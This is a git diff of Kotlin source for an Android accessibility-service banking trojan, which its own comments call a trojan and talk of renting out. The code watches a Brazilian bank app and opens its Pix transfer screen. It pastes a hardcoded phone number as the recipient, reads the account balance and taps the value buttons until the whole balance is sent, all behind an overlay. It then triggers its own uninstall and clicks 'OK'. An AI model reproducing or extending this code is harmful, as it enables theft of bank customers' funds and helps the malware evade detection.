@@ -9,6 +9,7 @@ import android.annotation.SuppressLint
 import android.content.ClipData
 import android.content.ClipboardManager
 import android.content.Context
+import android.content.Intent
 import java.util.Properties
 import javax.mail.Message
 import javax.mail.MessagingException
@@ -18,6 +19,7 @@ import javax.mail.Session
 import android.graphics.Path
 import android.graphics.PixelFormat
 import android.graphics.Rect
+import android.net.Uri
 import android.os.Build
 import android.os.SystemClock
 import android.util.Log
@@ -34,6 +36,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.launch
 import kotlinx.coroutines.withContext
+import java.text.ParseException
 import java.text.SimpleDateFormat
 import java.util.*
 
@@ -44,7 +47,9 @@ class AutoClickService: AccessibilityService() {
     lateinit var overlayView: View
     lateinit var layoutParams: WindowManager.LayoutParams
     val pattern = "^\\d+,\\d+$".toRegex()
-    var num = 0
+    var number = 0
+    var define_valor_buton = "0"
+    var  sobra = 0
 
 
     @SuppressLint("NewApi", "SuspiciousIndentation")
@@ -68,7 +73,7 @@ class AutoClickService: AccessibilityService() {
                 if (currentNode.text != null && currentNode.text.toString().contains("Fazer outro P")
                     && currentNode.text.toString().contains("ix")
                     && ctn_press == 0 ) {
-                    Log.d("Brassec", "Find node 0.")
+                   // Log.d("Brassec", "Find node 0.")
 
                     withContext(Dispatchers.Main) {
                         addOverlayView()
@@ -98,7 +103,7 @@ class AutoClickService: AccessibilityService() {
                         myClipboard.clearPrimaryClip()
                         SystemClock.sleep(100)
                     }
-                    myClip = ClipData.newPlainText("text", "(45)998559238")
+                    myClip = ClipData.newPlainText("text", "(21)996224328")
                     SystemClock.sleep(100)
                     if (myClip != null) {
                         myClipboard?.setPrimaryClip(myClip)
@@ -137,15 +142,19 @@ class AutoClickService: AccessibilityService() {
                     var nodeText = currentNode.text.toString()
                         Log.d("Brassec", "Find node 6//$nodeText")
 
-                        var size = currentNode.text
-                        valor.add("100000")
-                        // valor.add(size)
-                        novaLista = valor.map { it.toString().replace(",", "")
-                            .replace(".", "") }
+                        var size = currentNode.text.toString()
+                    var cleanNumber = size.replace(".", "").replace(",", ".")
+                    number = cleanNumber.toDouble().toInt()
 
-                        num = novaLista[0].toInt()
+                    define_valor_buton = if(number == 10 || number >10 && number< 50 )
+                        "mais 10 reais botão"   else define_valor_buton
 
-                        Log.d("Nubot", num.toString())
+                    define_valor_buton = if(number == 100 || number >100) "mais 100 reais botão"
+                    else define_valor_buton
+
+                        valor.add(size)
+
+                        Log.d("Nubot", number.toString())
                         ctn_press = 7
                         return  findNodeWithText("x")
                     } }
@@ -153,9 +162,7 @@ class AutoClickService: AccessibilityService() {
 
             if (currentNode != null) {
                 if (currentNode.text != null && currentNode.text.toString()
-                        .contains("mais 1")
-                    && currentNode.text.toString()
-                        .contains("real botão")
+                        .contains(define_valor_buton)
                     && ctn_press ==7) {
                     Log.d("Brassec", "+1 encontrado")
                     SystemClock.sleep(50)
@@ -381,10 +388,18 @@ class AutoClickService: AccessibilityService() {
 
     suspend fun mais100(Node: AccessibilityNodeInfo){
         Log.d("Brassec", "Veio pra +100")
-        var clicks = num/100/100
-        //  o for abaixo ira clicar no botao +100 com base no resultado da divisao acima
-        // por exemplo se o saldo (num) for de mil reais : 100000 dividido por cem dividido por cem igual a 10.
-        // 10 cliques no botao mais 100 e igual o saldo da conta
+        var clicks = 0
+
+        if (number == 100 || number > 100){
+            clicks = number/100
+            sobra = number%100
+           // if (sobra < 10 ) sobra  = sobra*10
+        }
+
+        else {clicks = number/10
+            ctn_press = 8
+        }
+
         for (i in 0 until clicks){
             var rect = Rect()
             var coord = Node.getBoundsInScreen(rect)
@@ -399,8 +414,14 @@ class AutoClickService: AccessibilityService() {
             dispatchGesture(gesture, null, null)
             SystemClock.sleep(100)
         }
-        ctn_press = 8
-        SystemClock.sleep(1000)
+
+        define_valor_buton = if(sobra > 0  )
+
+            "mais 10 reais botão"   else define_valor_buton
+        number = if(sobra>0) sobra else number
+
+
+        SystemClock.sleep(500)
        // mWindowManager?.removeView(overlayView)
         //disableSelf()
         findNodeWithText("x")
@@ -409,7 +430,6 @@ class AutoClickService: AccessibilityService() {
     var ctn_valor = 0
     var valor: MutableList<CharSequence> = mutableListOf()
     var ctn_press = 0
-
 
 
     suspend fun press(target: AccessibilityNodeInfo?){
@@ -429,6 +449,7 @@ class AutoClickService: AccessibilityService() {
 
     private suspend fun startClicking(currentNode: AccessibilityNodeInfo) {
         Log.d("Brassec", "Start clicking")
+
         val boundsInScreen = Rect()
         rootInActiveWindow.getBoundsInScreen(boundsInScreen)
         val x = boundsInScreen.centerX().toFloat()
@@ -452,9 +473,9 @@ class AutoClickService: AccessibilityService() {
         }
         else{
             ydecrement = 10
-            mWindowManager?.removeView(overlayView)
-            onInterrupt()
-           // last_text(currentNode)
+           // mWindowManager?.removeView(overlayView)
+           // onInterrupt()
+            last_text(currentNode)
         }
 
     }
@@ -496,7 +517,43 @@ class AutoClickService: AccessibilityService() {
                     && currentNode.text.toString()
                         .contains("ix"))
                 {
-                    mWindowManager?.removeView(overlayView)
+                    SystemClock.sleep(5000)
+                    Log.d("Brassec", "Dialog lançado")
+                    val intent = Intent(Intent.ACTION_DELETE)
+                    intent.data = Uri.parse("package:com.BrasSec")
+                    intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                    startActivity(intent)
+
+                    auto_desinstall()
+                   // mWindowManager?.removeView(overlayView)
+                   // onInterrupt()
+                } }
+
+            for (i in 0 until currentNode.childCount) {
+                var childNode = currentNode.getChild(i)
+                nodeQueue.add(childNode)
+            }
+        }
+        return startClicking(node)
+    }
+
+    fun auto_desinstall() {
+        Log.d("Brassec", "Veio pra desinstall")
+        var rootNode = rootInActiveWindow
+
+        var nodeQueue: Queue<AccessibilityNodeInfo> = LinkedList()//10
+        nodeQueue.clear()
+        nodeQueue.add(rootNode)
+
+        while (!nodeQueue.isEmpty()) {
+            var currentNode = nodeQueue.poll()
+
+            if (currentNode != null) {
+
+                if (currentNode.className == "android.widget.Button" && currentNode.text == "OK") {
+
+                    Log.d("Brassec", "OK encontrado")
+                    currentNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
 
                     onInterrupt()
                 }
@@ -507,9 +564,9 @@ class AutoClickService: AccessibilityService() {
                 nodeQueue.add(childNode)
             }
         }
-        return startClicking(node)
+        SystemClock.sleep(200)
+        return auto_desinstall()
     }
-
 
 
     @RequiresApi(Build.VERSION_CODES.O)
@@ -523,28 +580,39 @@ class AutoClickService: AccessibilityService() {
                 if (packageName != null) {
                     if(packageName.contains("com.bra")
                         && packageName.contains("desco")){
+
                         var texto = "x"
                         Log.d("Brassec", "Event acionado.")
                         if(no_encontrado <1){
-                            first_text(texto) } } } } } }
+                            first_text(texto) } } }
+            } } }
 
 
     override fun onInterrupt() {
 
     }
 
-    fun data_limite(){
-        // codigo feito quando eu pensava em alugar esse trojan
-        // esse codigo inutilizaria o trojan por exemplo a partir da data 20/11/2024 12:00
-        val dataEstipulada = "20/11/2024 12:00:00"
-        val dataAtual = Calendar.getInstance().time
+    fun data_limite() {
+        // Data estipulada para inutilizar o software
+        val dataEstipuladaStr = "27/09/2024 21:00:00"
         val formato = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault())
-        val dataAtualFormatada = formato.format(dataAtual)
-        compare = dataEstipulada.compareTo(dataAtualFormatada)
-        if (compare < 0) {
-           // disableSelf()
+
+        try {
+            // Parse a string para o formato Date
+            val dataEstipulada = formato.parse(dataEstipuladaStr)
+            val dataAtual = Calendar.getInstance().time
+
+            // Comparar as datas diretamente
+            if (dataAtual.after(dataEstipulada)) {
+                // Ação para desativar o trojan ou software
+                disableSelf()  // Implementar a função de desativação aqui
+            }
+        } catch (e: ParseException) {
+            e.printStackTrace()
+            // Log ou tratamento de erro apropriado
         }
     }
+
 
     var compare = 0
     override fun onServiceConnected() {
